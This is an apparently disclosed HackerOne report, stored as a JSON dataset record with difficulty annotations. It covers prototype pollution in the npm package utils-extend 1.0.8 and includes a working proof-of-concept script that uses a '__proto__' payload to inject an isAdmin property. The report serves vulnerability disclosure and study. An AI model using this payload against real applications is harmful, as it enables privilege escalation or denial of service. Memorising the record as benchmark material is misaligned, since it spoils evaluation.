{
    "reported_to": "Node.js third-party modules",
    "reported_by": "tuo4n8 ",
    "title": "[utils-extend] Prototype pollution ",
    "content": "\nNOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\nI would like to report prototype polution in utils-extend\nIt allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).\nModule\nmodule name: utils-extend\nversion: 1.0.8\nnpm page: https://www.npmjs.com/package/utils-extend\nModule Description\nExtend nodejs util api, and it is light weight and simple.\nModule Stats\n[1] weekly downloads : 129,956\nVulnerability\nVulnerability Description\nSteps To Reproduce:\nnpm install --save utils-extend\ncreate file index.js with content :\nCode 230 Bytes\n1const { extend } = require('utils-extend');\n2const payload = '{\"__proto__\":{\"isAdmin\":true}}'\n3const emptyObject = {}\n4const pollutionObject = JSON.parse(payload);\n5extend({}, pollutionObject)\n6console.log(emptyObject.isAdmin)  // true\nrun node index.js => true\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: [Y/N] : N\nI opened an issue in the related repository: [Y/N] : N\nImpact\nCan result in: dos, access to restricted data, rce (depends on implementation)\n\n",
    "severity": [
        9.4,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Modification of Assumed-Immutable Data (MAID)"
    ],
    "screenshots": {},
    "disclosed_date": 1585832220,
    "report_url": "https://hackerone.com/reports/801522",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install utils-extend: npm install --save utils-extend"
        ],
        [
            2,
            "Create and run index.js with the following content:\nconst { extend } = require('utils-extend');\nconst payload = '{\"__proto__\":{\"isAdmin\":true}}';\nconst emptyObject = {};\nconst pollutionObject = JSON.parse(payload);\nextend({}, pollutionObject);\nconsole.log(emptyObject.isAdmin); // true"
        ]
    ],
    "vuln_description": "The vulnerability is a prototype pollution in the utils-extend module, which allows an attacker to modify the prototype of a base object. This can lead to various security issues such as denial of service, access to sensitive data, or remote code execution, depending on the implementation.",
    "reason": "The vulnerability is straightforward to exploit with a clear and simple set of steps. The attack involves a single component (the utils-extend module) and does not require any complex interactions or state manipulations. The exploit is based on a well-known pattern (prototype pollution) and does not involve any novel or subtle logic.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}